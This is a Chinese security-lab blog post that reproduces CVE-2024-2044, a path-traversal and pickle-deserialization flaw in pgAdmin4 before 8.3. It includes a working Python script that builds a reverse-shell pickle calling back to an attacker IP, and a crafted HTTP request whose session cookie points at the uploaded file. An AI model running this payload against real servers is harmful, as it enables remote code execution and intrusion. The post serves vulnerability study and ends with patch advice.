#  『漏洞复现』pgAdmin4 < 8.3 (CVE-2024-2044) 反序列化漏洞   
goout  宸极实验室   2025-03-04 09:00  
  
**点击蓝字**  
  
  
  
**关注我们**  
  
> 日期：2025年03月04日  
> 作者：goout  
> 介绍：pgAdmin4 < 8.3 (CVE-2024-2044) 反序列化漏洞复现。  
  
## 0x00 影响范围  
  
pgAdmin4 < 8.3  
  
pgAdmin <= 8.3  
 在会话处理代码中反序列化用户会话时受到路径遍历漏洞的影响。如果服务器在 Windows  
 上运行，未经身份验证的攻击者可以加载和反序列化远程 pickle  
 对象并获得代码执行权。如果服务器在 Unix  
 上运行，经过身份验证的攻击者可以上传 pickle  
 对象，对其进行反序列化并获得代码执行权。  
## 0x01 搭建环境  
  
Ubuntu  
 搭建漏洞环境，需经过身份验证后才可触发反序列化造成代码执行。漏洞环境账号：vulhub@example.com  
，密码 vulhub  
。  
```
docker run -itd -p 5050:5050 vulhub/pgAdmin:7.6
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJmrQaXsVJo44h4rPanjO7loCEMic2c4nbxdM92icFjSwAicI0btKYG8sXcA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJmyPST8hEJbojxibH9MIYeiaCEnIcR6sdNxQuYiaANXtRuD47DY72uKOSibg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJm6TP7icclrHUQZ0iaibO91QBFvNhyBb6BdBTVduqDvia3EybaLMveNgD1FA/640?wx_fmt=jpeg&from=appmsg "")  
## 0x02 漏洞利用  
  
vps  
 先监听一个反弹端口：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJml4T6ribbOe5xcSQYDIemwPqibib80iayibPe3G445jSbrLfSdGcBZicatCqg/640?wx_fmt=jpeg&from=appmsg "")  
  
python  
 脚本转化文件成 posix.pickle  
 后进行文件上传，替换监听的 ip  
 和端口：  
```
import pickle
import os
import pickletools

class exp():
    def __reduce__(self):
        return (exec, ("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"yourip\",7788));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);",))

if __name__ == '__main__':
    c = exp()
    payload = pickle.dumps(c)
    with open('posix.pickle', 'wb') as f:
        f.write(payload)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJmFBRB58hdFO8r42Ke4TuKGjxFrW5EvsCM63EdabmsmQd7PvEMBR9F7Q/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJmgxGM5t8iaXc3icN6A32qfDKfddN6iaCLZxZu9nILT1HOibSZ7alLbzp6qQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJmTAD3rCUI3Sn5sYLUmbVrc1wwicsS20Sxw65c84eGPggzCAQgdUAx9eA/640?wx_fmt=jpeg&from=appmsg "")  
  
抓包修改 Cookie  
 ，vulhub@example.com  
 要把 @  
 换成 _  
 :  
```
POST /settings/save_tree_state/ HTTP/1.1
Host: xxx:5050
Content-Length: 2
X-pgA-CSRFToken:
IjE0MGE3MTVmMmIzMDgwYmYwOTJmNGU5ZjUyOWJlNTQ1OTcwZTdhNDki.ZgGgmA.YDRgze
GzIulLQT1YgWn_A7Bv5c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit
537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0
Content-type: application/json
Accept: */*
Origin: http://xxx:5050
Referer: http://xxx:5050
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie:  pga4_session=/var/lib/pgAdmin/storage/vulhub_example.com
posix.pickle!a; pgAdmin_LANGUAGE=en
Connection: close

{}
```  
  
修改完毕后进行发包，无响应即反弹成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJmtWbZkzgRdGaknT2F4nBvsKeeQth9l0kVZrDd8yAkh0mzCwgiaY0d0Aw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvfxgI1L1jyDEn3E0U8OtMJmNLppvt2ga7RIpJicAEh6VK76j52En9v3apzy5QTnqw72tLoBaltYr8A/640?wx_fmt=jpeg&from=appmsg "")  
  
## 0x03 总结  
  
漏洞成因有大佬分析的很仔细，pgAdmin4  
 使用基于文件的会话管理方法。会话文件作为 pickle  
 对象保存在磁盘上。当用户执行请求时，会话 Cookie  
 的值 pga4_session  
 用于检索文件，然后反序列化其内容，最后验证其签名。  
  
漏洞分析：  
```
https://www.shielder.com/advisories/pgAdmin-path-traversal_leads_to_unsafe_deserialization_and_rce/
```  
  
漏洞环境下载（版本 <= 8.3  
）：  
```
https://www.postgresql.org/ftp/pgAdmin/pgAdmin4/
```  
  
修复建议：更新版本 > 8.3  
 。  
  
  
**免责声明：本文仅供安全研究与讨论之用，严禁用于非法用途，违者后果自负。**  
  
  
点此亲启  
  
**ABOUT US**  
  
  
  
**宸极实验室**  
隶属山东九州信泰信息科技股份有限公司，致力于网络安全对抗技术研究，是山东省发改委认定的“网络安全对抗关键技术山东省工程研究中心”。团队成员专注于 Web 安全、移动安全、红蓝对抗等领域，善于利用黑客视角发现和解决网络安全问题。  
  
团队自成立以来，圆满完成了多次国家级、省部级重要网络安全保障和攻防演习活动，并积极参加各类网络安全竞赛，屡获殊荣。  
  
对信息安全感兴趣的小伙伴欢迎加入宸极实验室，关注公众号，回复『招聘』，获取联系方式。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/YCOL3hU8ffUqCzyREqVSq3AFOuib0FwZVRlWXWOXsYozHV0XiaYJVGoTian40eVZcGbhUIs9Vltp8YCicncMWEVm9XUSIP0Bj3cA/640?wx_fmt=svg "")  
  
  
